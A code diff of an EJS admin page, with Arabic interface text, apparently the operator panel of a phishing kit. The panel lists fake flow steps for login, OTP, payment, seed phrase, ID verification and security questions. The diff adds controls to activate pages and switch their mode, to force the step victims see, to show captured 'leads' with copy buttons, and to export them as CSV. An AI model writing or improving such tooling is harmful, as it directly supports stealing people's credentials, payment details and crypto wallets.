@@ -6,72 +6,139 @@
 <title><%= page.title %> — إدارة</title>
 <style>
   * { box-sizing:border-box; }
-  body { font-family:system-ui,Tahoma; background:#0b0f19; color:#eef2ff; margin:0; padding:28px; }
-  .wrap { max-width:1060px; margin:auto; }
+  body { font-family:system-ui,Tahoma; background:#0b0f19; color:#eef2ff; margin:0; padding:24px; }
+  .wrap { max-width:1080px; margin:auto; }
   a { color:#8ab4ff; text-decoration:none; }
-  h2 { margin:28px 0 14px; color:#8ab4ff; font-size:1.05rem; }
-  table { width:100%; border-collapse:collapse; background:#151b2b; border-radius:14px; overflow:hidden; margin-bottom:28px; }
-  th,td { padding:10px 12px; text-align:right; border-bottom:1px solid #ffffff10; font-size:.85rem; }
-  th { background:#1c2436; font-size:.82rem; }
-  label { display:grid; gap:6px; font-size:.85rem; margin-bottom:12px; }
-  input,select { width:100%; padding:10px; border-radius:9px; border:1px solid #ffffff22; background:#ffffff0d; color:#eef2ff; font-family:inherit; font-size:.92rem; }
-  .btn { background:#5b8cff; color:#fff; padding:9px 16px; border:0; border-radius:9px; cursor:pointer; font-size:.88rem; text-decoration:none; display:inline-block; }
-  .btn-del { background:#ef4444; }
-  .btn-warn { background:#f59e0b; color:#000; }
-  .btn-green { background:#16a34a; }
-  .btn-gray { background:#374151; }
-  .badge { padding:3px 10px; border-radius:99px; font-size:.75rem; display:inline-block; }
-  .on { background:#16a34a33; color:#4ade80; }
-  .off { background:#ef444433; color:#f87171; }
-  .online-mode { background:#1e40af33; color:#93c5fd; }
-  .offline-mode { background:#78350f33; color:#fcd34d; }
-  .grid2 { display:grid; grid-template-columns:1fr 1fr; gap:12px; }
+
+  /* ── Section cards ───────────────────────────── */
+  .section { background:#151b2b; padding:20px 22px; border-radius:16px; margin-bottom:18px; border:1px solid #ffffff08; }
+  .section h3 { font-size:.95rem; margin:0 0 16px; color:#8ab4ff; display:flex; align-items:center; gap:7px; }
+
+  /* ── Grids ───────────────────────────────────── */
+  .grid2 { display:grid; grid-template-columns:1fr 1fr; gap:14px; }
   .grid3 { display:grid; grid-template-columns:1fr 1fr 1fr; gap:10px; }
-  .section { background:#151b2b; padding:18px 20px; border-radius:14px; margin-bottom:18px; }
-  .section h3 { font-size:.95rem; margin:0 0 14px; color:#8ab4ff; }
-  .lead-data { font-size:.8rem; max-width:280px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
-  .step-card { background:#0b0f19; border-radius:10px; padding:12px 14px; border:1.5px solid #ffffff12; }
-  .step-card .step-name { font-size:.82rem; font-weight:600; color:#8ab4ff; margin-bottom:4px; }
-  .step-card .step-form { font-size:.75rem; opacity:.5; }
-  .step-card a { font-size:.78rem; }
-  .step-badge { padding:2px 8px; border-radius:6px; font-size:.72rem; }
-  .form-login { background:#1e3a5f30; color:#60a5fa; }
-  .form-otp { background:#14532d30; color:#4ade80; }
-  .form-payment { background:#78350f30; color:#fcd34d; }
-  .form-seed_phrase { background:#4c1d9530; color:#c4b5fd; }
-  .form-verify,.form-id_verify { background:#1c1917; color:#d6d3d1; }
-  .form-checkpoint,.form-locked,.form-confirm,.form-complete { background:#1f2937; color:#9ca3af; }
-  @media(max-width:700px){.grid2,.grid3{grid-template-columns:1fr}}
+
+  /* ── Buttons ─────────────────────────────────── */
+  .btn { background:#5b8cff; color:#fff; padding:9px 16px; border:0; border-radius:9px; cursor:pointer; font-size:.88rem; text-decoration:none; display:inline-block; white-space:nowrap; }
+  .btn:hover { background:#4a7be8; }
+  .btn-del   { background:#ef4444; } .btn-del:hover { background:#dc2626; }
+  .btn-warn  { background:#f59e0b; color:#000; } .btn-warn:hover { background:#d97706; }
+  .btn-green { background:#16a34a; } .btn-green:hover { background:#15803d; }
+  .btn-gray  { background:#374151; } .btn-gray:hover { background:#4b5563; }
+  .btn-outline { background:transparent; border:1px solid #5b8cff44; color:#8ab4ff; }
+  .btn-outline:hover { background:#5b8cff11; }
+  .btn-sm { padding:5px 11px; font-size:.78rem; border-radius:7px; }
+  .btn-copy { background:#1e293b; color:#94a3b8; padding:3px 9px; border-radius:6px; font-size:.72rem; cursor:pointer; border:1px solid #ffffff15; transition:.15s; }
+  .btn-copy:hover { background:#334155; color:#e2e8f0; }
+  .btn-copy.copied { background:#16a34a22; color:#4ade80; border-color:#4ade8033; }
+
+  /* ── Header ──────────────────────────────────── */
+  .page-header { display:flex; justify-content:space-between; align-items:flex-start; flex-wrap:wrap; gap:14px; margin-bottom:22px; }
+  .page-header h1 { margin:0 0 8px; font-size:1.5rem; }
+  .meta-row { display:flex; gap:10px; align-items:center; flex-wrap:wrap; }
+
+  /* ── Badges ──────────────────────────────────── */
+  .badge { padding:3px 10px; border-radius:99px; font-size:.76rem; font-weight:600; display:inline-block; white-space:nowrap; }
+  .on  { background:#16a34a22; color:#4ade80; border:1px solid #4ade8033; }
+  .off { background:#ef444422; color:#f87171; border:1px solid #f8717133; }
+  .online-mode  { background:#1e3a8a22; color:#93c5fd; border:1px solid #93c5fd33; }
+  .offline-mode { background:#78350f22; color:#fcd34d; border:1px solid #fcd34d33; }
+  .step-badge { padding:2px 8px; border-radius:6px; font-size:.72rem; font-weight:600; }
+  .form-login          { background:#1e3a5f30; color:#60a5fa; }
+  .form-otp            { background:#14532d30; color:#4ade80; }
+  .form-payment        { background:#78350f30; color:#fcd34d; }
+  .form-seed_phrase,
+  .form-otp_long       { background:#4c1d9530; color:#c4b5fd; }
+  .form-verify,
+  .form-id_verify      { background:#1c191730; color:#d6d3d1; }
+  .form-security_q     { background:#1a2e3a30; color:#7dd3fc; }
+  .form-checkpoint,
+  .form-locked,
+  .form-confirm,
+  .form-complete       { background:#1f293730; color:#9ca3af; }
+
+  /* ── Stat pills in header ─────────────────────── */
+  .stat-pill { display:flex; align-items:center; gap:5px; font-size:.85rem; }
+  .stat-pill .val { font-weight:700; color:#8ab4ff; }
+
+  /* ── Toggle panel ────────────────────────────── */
+  .toggle-panel { background:#0b0f19; border-radius:12px; padding:16px; }
+  .toggle-panel .lbl { font-size:.82rem; opacity:.6; margin-bottom:6px; }
+  .toggle-panel .mode-val { font-size:1.05rem; font-weight:700; margin-bottom:12px; }
+
+  /* ── Step cards ──────────────────────────────── */
+  .step-card { background:#0b0f19; border-radius:10px; padding:12px 14px; border:1.5px solid #ffffff10; transition:.15s; }
+  .step-card:hover { border-color:#5b8cff44; }
+  .step-card .step-name { font-size:.82rem; font-weight:700; color:#8ab4ff; margin-bottom:4px; display:flex; align-items:center; gap:6px; }
+  .step-card .step-fields { font-size:.73rem; opacity:.45; margin-bottom:7px; }
+  .step-card a { font-size:.78rem; color:#60a5fa; }
+
+  /* ── Leads table ─────────────────────────────── */
+  table { width:100%; border-collapse:collapse; }
+  th,td { padding:11px 12px; text-align:right; border-bottom:1px solid #ffffff09; font-size:.85rem; }
+  th { background:#1c2436; font-size:.78rem; opacity:.65; font-weight:600; }
+  tr:last-child td { border-bottom:none; }
+  tr:hover td { background:#ffffff03; }
+  .lead-data { font-family:monospace; font-size:.78rem; color:#cbd5e1; max-width:340px; }
+  .lead-data-wrap { display:flex; align-items:center; gap:8px; }
+
+  /* ── Form inputs ─────────────────────────────── */
+  label { display:grid; gap:6px; font-size:.84rem; margin-bottom:12px; }
+  input,select,textarea {
+    width:100%; padding:10px 12px; border-radius:9px;
+    border:1px solid #ffffff18; background:#0b0f19;
+    color:#eef2ff; font-family:inherit; font-size:.9rem;
+  }
+  input:focus, select:focus { outline:none; border-color:#5b8cff55; }
+
+  /* ── Bottom actions ──────────────────────────── */
+  .bottom-actions { display:flex; gap:10px; flex-wrap:wrap; align-items:center; margin-top:8px; }
+
+  /* ── Toast ───────────────────────────────────── */
+  #toast { position:fixed; bottom:24px; left:50%; transform:translateX(-50%) translateY(80px); background:#16a34a; color:#fff; padding:10px 22px; border-radius:10px; font-size:.88rem; opacity:0; transition:.3s; pointer-events:none; z-index:999; }
+  #toast.show { opacity:1; transform:translateX(-50%) translateY(0); }
+
+  @media(max-width:700px){ .grid2,.grid3{grid-template-columns:1fr} .page-header{flex-direction:column} }
 </style>
 </head>
 <body>
 <div class="wrap">
-  <p style="margin-bottom:16px"><a href="/admin">← لوحة التحكم</a></p>
 
-  <!-- Header -->
-  <div style="display:flex;justify-content:space-between;align-items:flex-start;flex-wrap:wrap;gap:12px;margin-bottom:20px">
+  <p style="margin-bottom:14px"><a href="/admin">← لوحة التحكم</a></p>
+
+  <!-- ── Page Header ────────────────────────────── -->
+  <div class="page-header">
     <div>
-      <h1 style="margin:0 0 6px;font-size:1.4rem"><%= page.title %></h1>
-      <p style="opacity:.6;font-size:.88rem;margin:0;display:flex;gap:12px;flex-wrap:wrap;align-items:center">
-        <span>القالب: <b><%= page.template_name %></b></span>
-        <span class="badge <%= page.active ? 'on' : 'off' %>"><%= page.active ? 'مفعّلة' : 'موقوفة' %></span>
+      <h1><%= page.title %></h1>
+      <div class="meta-row">
+        <span style="font-size:.85rem;opacity:.5">القالب: <b><%= page.template_name %></b></span>
+        <span class="badge <%= page.active == 1 ? 'on' : 'off' %>"><%= page.active == 1 ? '✅ مفعّلة' : '⛔ موقوفة' %></span>
         <span class="badge <%= page.mode === 'offline' ? 'offline-mode' : 'online-mode' %>"><%= page.mode === 'offline' ? '📴 أوفلاين' : '🌐 أونلاين' %></span>
-        <span>👁 <b><%= page.views %></b></span>
-      </p>
+        <span class="stat-pill">👁 <span class="val"><%= page.views || 0 %></span></span>
+        <span class="stat-pill">🎯 <span class="val" style="color:#4ade80"><%= leads.length %></span> ليد</span>
+      </div>
     </div>
-    <div style="display:flex;gap:8px;flex-wrap:wrap">
-      <a href="/p/<%= page.slug %>" target="_blank" class="btn">🔗 عرض</a>
+    <div style="display:flex;gap:8px;flex-wrap:wrap;align-items:flex-start">
+      <!-- Active toggle -->
+      <form method="POST" action="/admin/pages/<%= page.id %>/toggle-active" style="display:inline">
+        <input type="hidden" name="_csrf" value="<%= csrfToken %>">
+        <button type="submit" class="btn <%= page.active == 1 ? 'btn-warn' : 'btn-green' %>">
+          <%= page.active == 1 ? '⛔ إيقاف' : '✅ تفعيل' %>
+        </button>
+      </form>
+      <a href="/p/<%= page.slug %>" target="_blank" class="btn btn-outline">🔗 عرض</a>
     </div>
   </div>
 
-  <!-- Mode + Flow Control -->
+  <!-- ── Mode + Flow Control ────────────────────── -->
   <div class="section">
     <h3>🎛️ تحكم في المود والخطوات</h3>
-    <div class="grid2" style="margin-bottom:16px">
+    <div class="grid2" style="margin-bottom:18px">
+
       <!-- Online/Offline toggle -->
-      <div style="background:#0b0f19;border-radius:10px;padding:14px 16px">
-        <div style="font-size:.85rem;margin-bottom:8px;opacity:.7">المود الحالي</div>
-        <div style="font-size:1.1rem;font-weight:700;margin-bottom:12px"><%= page.mode === 'offline' ? '📴 أوفلاين (مغلق)' : '🌐 أونلاين (شغال)' %></div>
+      <div class="toggle-panel">
+        <div class="lbl">المود الحالي</div>
+        <div class="mode-val"><%= page.mode === 'offline' ? '📴 أوفلاين (مغلق)' : '🌐 أونلاين (شغال)' %></div>
         <form method="POST" action="/admin/pages/<%= page.id %>/mode">
           <input type="hidden" name="_csrf" value="<%= csrfToken %>">
           <button type="submit" class="btn <%= page.mode === 'offline' ? 'btn-green' : 'btn-warn' %>" style="width:100%">
@@ -81,8 +148,8 @@
       </div>
 
       <!-- Flow step override -->
-      <div style="background:#0b0f19;border-radius:10px;padding:14px 16px">
-        <div style="font-size:.85rem;margin-bottom:8px;opacity:.7">تحديد الخطوة الافتراضية</div>
+      <div class="toggle-panel">
+        <div class="lbl">تحديد الخطوة الافتراضية</div>
         <form method="POST" action="/admin/pages/<%= page.id %>/flow-step">
           <input type="hidden" name="_csrf" value="<%= csrfToken %>">
           <select name="step" style="margin-bottom:10px">
@@ -96,44 +163,65 @@
       </div>
     </div>
 
-    <!-- Pages/Steps list -->
-    <div style="font-size:.83rem;opacity:.6;margin-bottom:10px">خطوات الفلو (اضغط للمعاينة)</div>
+    <!-- Steps list -->
+    <div style="font-size:.8rem;opacity:.5;margin-bottom:10px">خطوات الفلو (اضغط للمعاينة)</div>
     <div class="grid3">
       <% tpl.pages.forEach((p, i) => { %>
         <div class="step-card">
-          <div class="step-name"><%= i+1 %>. <%= p.step_label || p.slug %> <span class="step-badge form-<%= p.form_type || p.layout %>"><%= p.form_type || p.layout %></span></div>
-          <div class="step-form" style="margin-bottom:6px"><%= (p.fields||[]).join(', ') || 'لا حقول' %></div>
+          <div class="step-name">
+            <span style="opacity:.4"><%= i+1 %>.</span>
+            <%= p.step_label || p.slug %>
+            <span class="step-badge form-<%= p.form_type || p.layout %>"><%= p.form_type || p.layout %></span>
+          </div>
+          <div class="step-fields"><%= (p.fields||[]).join(', ') || 'لا حقول' %></div>
           <a href="/p/<%= page.slug %>/<%= p.slug %>" target="_blank">🔗 معاينة</a>
         </div>
       <% }) %>
     </div>
   </div>
 
-  <!-- Leads -->
-  <h2>الليدز (<%= leads.length %>)</h2>
-  <% if (leads.length) { %>
-    <table>
-      <tr><th>#</th><th>الخطوة</th><th>البيانات</th><th>التاريخ</th></tr>
-      <% leads.forEach(l => {
-        let d = {}; try { d = JSON.parse(l.data); } catch {}
-        const step = d.step || 'submit';
-        delete d.step; delete d._csrf; delete d._hp; delete d._step;
-        const preview = Object.entries(d).map(([k,v]) => `${k}: ${v}`).join(' • ');
-        const formType = tpl.pages.find(p=>p.slug===step)?.form_type || step;
-      %>
-        <tr>
-          <td><%= l.id %></td>
-          <td><span class="badge step-badge form-<%= formType %>"><%= tpl.pages.find(p=>p.slug===step)?.step_label || step %></span></td>
-          <td class="lead-data" title="<%= preview %>"><%= preview %></td>
-          <td style="font-size:.78rem;opacity:.5"><%= l.created_at %></td>
-        </tr>
-      <% }) %>
-    </table>
-  <% } else { %>
-    <p style="opacity:.4;margin-bottom:28px">مفيش ليدز لسه.</p>
-  <% } %>
+  <!-- ── Leads ──────────────────────────────────── -->
+  <div class="section">
+    <h3>🎯 الليدز (<%= leads.length %>)
+      <% if (leads.length) { %>
+        <a href="/admin/pages/<%= page.id %>/export" class="btn btn-sm btn-green" style="margin-right:auto">📥 تصدير CSV</a>
+      <% } %>
+    </h3>
+    <% if (leads.length) { %>
+      <div style="overflow-x:auto">
+        <table>
+          <thead><tr><th>#</th><th>الخطوة</th><th>البيانات</th><th>التاريخ</th><th></th></tr></thead>
+          <tbody>
+          <% leads.forEach(l => {
+            let d = {}; try { d = JSON.parse(l.data); } catch {}
+            const step = d.step || 'submit';
+            delete d.step; delete d._csrf; delete d._hp; delete d._step;
+            const preview = Object.entries(d).map(([k,v]) => `${k}: ${v}`).join(' • ');
+            const formType = tpl.pages.find(p=>p.slug===step)?.form_type || step;
+            const stepLabel = tpl.pages.find(p=>p.slug===step)?.step_label || step;
+          %>
+            <tr>
+              <td style="opacity:.4;font-size:.78rem"><%= l.id %></td>
+              <td><span class="badge step-badge form-<%= formType %>"><%= stepLabel %></span></td>
+              <td>
+                <div class="lead-data-wrap">
+                  <span class="lead-data" title="<%= preview %>"><%= preview %></span>
+                  <button class="btn-copy" onclick="copyLead(this, `<%= preview.replace(/`/g,'\\`') %>`)">نسخ</button>
+                </div>
+              </td>
+              <td style="font-size:.76rem;opacity:.4;white-space:nowrap"><%= l.created_at %></td>
+              <td></td>
+            </tr>
+          <% }) %>
+          </tbody>
+        </table>
+      </div>
+    <% } else { %>
+      <p style="opacity:.35;margin:0">مفيش ليدز لسه.</p>
+    <% } %>
+  </div>
 
-  <!-- Edit Form -->
+  <!-- ── Edit Form ──────────────────────────────── -->
   <div class="section">
     <h3>✏️ تعديل الصفحة</h3>
     <form method="POST" action="/admin/pages/<%= page.id %>">
@@ -143,31 +231,50 @@
         <label>السلاج<input name="slug" value="<%= page.slug %>" required></label>
       </div>
       <label>رقم القالب<input name="template_id" value="<%= page.template_id %>"></label>
-      <label style="display:flex;gap:8px;align-items:center;flex-direction:row">
-        <input type="checkbox" name="active" value="1" <%= page.active ? 'checked' : '' %> style="width:auto">
+      <label style="display:flex;gap:8px;align-items:center;flex-direction:row;margin-bottom:16px">
+        <input type="checkbox" name="active" value="1" <%= page.active == 1 ? 'checked' : '' %> style="width:auto;margin:0">
         <span>الصفحة مفعّلة</span>
       </label>
-      <input type="hidden" name="headline" value="<%= page.headline || '' %>">
+      <input type="hidden" name="headline"    value="<%= page.headline    || '' %>">
       <input type="hidden" name="subheadline" value="<%= page.subheadline || '' %>">
-      <input type="hidden" name="body" value="<%= page.body || '' %>">
+      <input type="hidden" name="body"        value="<%= page.body        || '' %>">
       <input type="hidden" name="button_text" value="<%= page.button_text || 'سجل الآن' %>">
-      <input type="hidden" name="theme" value="<%= page.theme || 'dark' %>">
-      <input type="hidden" name="pixel" value="<%= page.pixel || '' %>">
-      <input type="hidden" name="fields" value="<%= page.fields %>">
-      <button type="submit" class="btn" style="margin-top:10px;padding:10px 24px">💾 حفظ</button>
+      <input type="hidden" name="theme"       value="<%= page.theme       || 'dark' %>">
+      <input type="hidden" name="pixel"       value="<%= page.pixel       || '' %>">
+      <input type="hidden" name="fields"      value="<%= page.fields %>">
+      <button type="submit" class="btn" style="padding:10px 26px">💾 حفظ</button>
     </form>
   </div>
 
-  <div style="display:flex;gap:10px;flex-wrap:wrap">
+  <!-- ── Bottom actions ─────────────────────────── -->
+  <div class="bottom-actions">
     <a href="/admin/templates?page_id=<%= page.id %>" class="btn">🎨 تغيير القالب</a>
-    <% if (leads.length) { %>
-      <a href="/admin/pages/<%= page.id %>/export" class="btn btn-green">📥 تصدير CSV</a>
-    <% } %>
     <form method="POST" action="/admin/pages/<%= page.id %>/delete" onsubmit="return confirm('حذف الصفحة وكل الليدز؟')">
       <input type="hidden" name="_csrf" value="<%= csrfToken %>">
       <button class="btn btn-del">🗑 حذف</button>
     </form>
   </div>
+
 </div>
+
+<!-- Toast -->
+<div id="toast"></div>
+
+<script>
+function copyLead(btn, text) {
+  navigator.clipboard.writeText(text).then(() => {
+    btn.textContent = '✓ تم';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'نسخ'; btn.classList.remove('copied'); }, 2000);
+    showToast('تم النسخ ✓');
+  });
+}
+function showToast(msg) {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.classList.add('show');
+  setTimeout(() => t.classList.remove('show'), 2500);
+}
+</script>
 </body>
 </html>
